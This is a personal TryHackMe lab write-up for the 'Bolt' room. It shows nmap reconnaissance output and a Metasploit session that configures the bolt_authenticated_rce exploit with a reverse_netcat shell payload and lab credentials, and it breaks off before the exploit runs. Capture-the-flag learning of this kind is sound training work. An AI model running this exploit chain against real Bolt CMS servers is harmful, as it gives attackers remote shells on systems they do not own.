<h3> Welcome to the <em>TryHackMe ...</em></h3>
<h1>Learn ></h1 >
<h2>Bolt</h2>
<p>A hero is unleashed.</p><br>
<p>October 29, 2024<br></p>

<div style="display: flex; justify-content: center; align-items: center;">
    <img src="https://github.com/user-attachments/assets/b8aac932-dd78-4973-9718-ed9bd0ec383a" width="150px" height="150px"/>
</div>
<br>


![image](https://github.com/user-attachments/assets/0822a5b1-9aed-4961-9bbb-6c7b125a086e)



<p>Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s key part of my 176-day-streak.<br>Let´s get started!!<br><br>
Access this TryHackMe Room clicking <a href="https://tryhackme.com/r/room/bolt">Bolt</a>.<br>
</p>

<h2>Task 1 - Deploy the machine</h2>



root@ip-10-10-108-106:~# nmap --min-rate 1000 10.10.205.193

Starting Nmap 7.60 ( https://nmap.org ) at 2024-10-30 01:08 GMT
Nmap scan report for ip-10-10-205-193.eu-west-1.compute.internal (10.10.205.193)
Host is up (0.00030s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt
MAC Address: 02:58:3A:E9:06:3F (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.55 seconds
root@ip-10-10-108-106:~# 



root@ip-10-10-108-106:~# nmap -p22,80,8000 -A 10.10.205.193 -sCV

Starting Nmap 7.60 ( https://nmap.org ) at 2024-10-30 01:09 GMT
Nmap scan report for ip-10-10-205-193.eu-west-1.compute.internal (10.10.205.193)
Host is up (0.00029s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:85:ec:54:f2:01:b1:94:40:de:42:e8:21:97:20:80 (RSA)
|   256 77:c7:c1:ae:31:41:21:e4:93:0e:9a:dd:0b:29:e1:ff (ECDSA)
|_  256 07:05:43:46:9d:b2:3e:f0:4d:69:67:e4:91:d3:d3:7f (EdDSA)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8000/tcp open  http    PHP 7.2.32-1
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Date: Wed, 30 Oct 2024 01:09:30 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: private, must-revalidate
|     Date: Wed, 30 Oct 2024 01:09:30 GMT
|     Content-Type: text/html; charset=UTF-8
|     pragma: no-cache
|     expires: -1
|     X-Debug-Token: fd8ba7
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Bolt | A hero is unleashed</title>
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">
|     <meta name="generator" content="Bolt">
|     </head>
|     <body>
|     href="#main-content" class="vis
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Wed, 30 Oct 2024 01:09:30 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: public, s-maxage=600
|     Date: Wed, 30 Oct 2024 01:09:30 GMT
|     Content-Type: text/html; charset=UTF-8
|     X-Debug-Token: 71b811
|     <!doctype html>
|     <html lang="en-GB">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Bolt | A hero is unleashed</title>
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">
|     <meta name="generator" content="Bolt">
|     <link rel="canonical" href="http://0.0.0.0:8000/">
|     </head>
|_    <body class="front">
|_http-generator: Bolt
|_http-title: Bolt | A hero is unleashed
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.60%I=7%D=10/30%Time=67218749%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,29E1,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Wed,\x2030\x20Oct\x2
SF:02024\x2001:09:30\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PH
SF:P/7\.2\.32-1\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x20p
SF:ublic,\x20s-maxage=600\r\nDate:\x20Wed,\x2030\x20Oct\x202024\x2001:09:3
SF:0\x20GMT\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nX-Debug-Tok
SF:en:\x2071b811\r\n\r\n<!doctype\x20html>\n<html\x20lang=\"en-GB\">\n\x20
SF:\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"
SF:utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\"viewport\"\x2
SF:0content=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Bolt\x20\|\x20
SF:A\x20hero\x20is\x20unleashed</title>\n\x20\x20\x20\x20\x20\x20\x20\x20<
SF:link\x20href=\"https://fonts\.googleapis\.com/css\?family=Bitter\|Robot
SF:o:400,400i,700\"\x20rel=\"stylesheet\">\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20<link\x20rel=\"stylesheet\"\x20href=\"/theme/base-2018/css/bulma\.css
SF:\?8ca0842ebb\">\n\x20\x20\x20\x20\x20\x20\x20\x20<link\x20rel=\"stylesh
SF:eet\"\x20href=\"/theme/base-2018/css/theme\.css\?6cb66bfe9f\">\n\x20\x2
SF:0\x20\x20\t<meta\x20name=\"generator\"\x20content=\"Bolt\">\n\x20\x20\x
SF:20\x20\t<link\x20rel=\"canonical\"\x20href=\"http://0\.0\.0\.0:8000/\">
SF:\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body\x20class=\"front\">\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20<a\x20")%r(FourOhFourRequest,16C3,"HTTP/
SF:1\.0\x20404\x20Not\x20Found\r\nDate:\x20Wed,\x2030\x20Oct\x202024\x2001
SF::09:30\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PHP/7\.2\.32-
SF:1\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x20private,\x20
SF:must-revalidate\r\nDate:\x20Wed,\x2030\x20Oct\x202024\x2001:09:30\x20GM
SF:T\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\npragma:\x20no-cach
SF:e\r\nexpires:\x20-1\r\nX-Debug-Token:\x20fd8ba7\r\n\r\n<!doctype\x20htm
SF:l>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initia
SF:l-scale=1\.0\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20<title>Bolt\x20\|\x20A\x20hero\x20is\x20unleashed</title>\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<link\x20href=\"https://fonts\.googleapis
SF:\.com/css\?family=Bitter\|Roboto:400,400i,700\"\x20rel=\"stylesheet\">\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"
SF:/theme/base-2018/css/bulma\.css\?8ca0842ebb\">\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/theme/base-2018/css/the
SF:me\.css\?6cb66bfe9f\">\n\x20\x20\x20\x20\t<meta\x20name=\"generator\"\x
SF:20content=\"Bolt\">\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\"#main-content\"\x20class=\"
SF:vis");
MAC Address: 02:58:3A:E9:06:3F (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.8 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.8 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.29 ms ip-10-10-205-193.eu-west-1.compute.internal (10.10.205.193)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.78 seconds
root@ip-10-10-108-106:~# 

![image](https://github.com/user-attachments/assets/0eb0d9c6-796d-4263-af32-c5e91d6f7dda)

![image](https://github.com/user-attachments/assets/fa075cd7-f2aa-4557-84c0-901819ce2656)

![image](https://github.com/user-attachments/assets/dc3e0876-5fa3-4b69-934d-3988797ef97c)

![image](https://github.com/user-attachments/assets/48392342-d162-4cca-a463-d26d12dc2900)

![image](https://github.com/user-attachments/assets/a7e214eb-0582-454b-9876-dee34036d01b)

![image](https://github.com/user-attachments/assets/084f7268-efe0-4256-a185-db490740df1e)



oot@ip-10-10-108-106:~# sudo msfconsole
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
                                                  

         .                                         .
 .

      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
       '   dB'                     BBP
    dB'dB'dB' dBBP     dBP     dBP BB
   dB'dB'dB' dBP      dBP     dBP  BB
  dB'dB'dB' dBBBBP   dBP     dBBBBBBB

                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
          .                  .                  dB' dBP    dB'.BP
                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP

                                                                    .
                .
        o                  To boldly go where no
                            shell has gone before


       =[ metasploit v6.3.5-dev-                          ]
+ -- --=[ 2294 exploits - 1201 auxiliary - 410 post       ]
+ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Writing a custom module? After editing your 
module, why not try the reload command
Metasploit Documentation: https://docs.metasploit.com/

msf6 > use unix/webapp/bolt_authenticated_rce
[*] Using configured payload cmd/unix/reverse_netcat
msf6 exploit(unix/webapp/bolt_authenticated_rce) > show options

Module options (exploit/unix/webapp/bolt_authenticated_rce):

   Name                 Current Setting        Required  Description
   ----                 ---------------        --------  -----------
   FILE_TRAVERSAL_PATH  ../../../public/files  yes       Traversal path from "/files" on the web server to "/root" on
                                                         the server
   PASSWORD                                    yes       Password to authenticate with
   Proxies                                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                      yes       The target host(s), see https://docs.metasploit.com/docs/usin
                                                         g-metasploit/basics/using-metasploit.html
   RPORT                8000                   yes       The target port (TCP)
   SSL                  false                  no        Negotiate SSL/TLS for outgoing connections
   SSLCert                                     no        Path to a custom SSL certificate (default is randomly generat
                                                         ed)
   TARGETURI            /                      yes       Base path to Bolt CMS
   URIPATH                                     no        The URI to use for this exploit (default is random)
   USERNAME                                    yes       Username to authenticate with
   VHOST                                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,certutil,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on th
                                       e local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.

Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   Linux (cmd)



View the full module info with the info, or info -d command.

msf6 exploit(unix/webapp/bolt_authenticated_rce) > set LHOST 10.10.108.106
LHOST => 10.10.108.106
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set USERNAME bolt
USERNAME => bolt
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set PASSWORD boltadmin123
PASSWORD => boltadmin123
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set RHOSTS 10.10.205.193
RHOSTS => 10.10.205.193
msf6 exploit(unix/webapp/bolt_authenticated_rce) > 









![image](https://github.com/user-attachments/assets/12659e70-0803-4cd3-b9a5-b4eb1505a062)

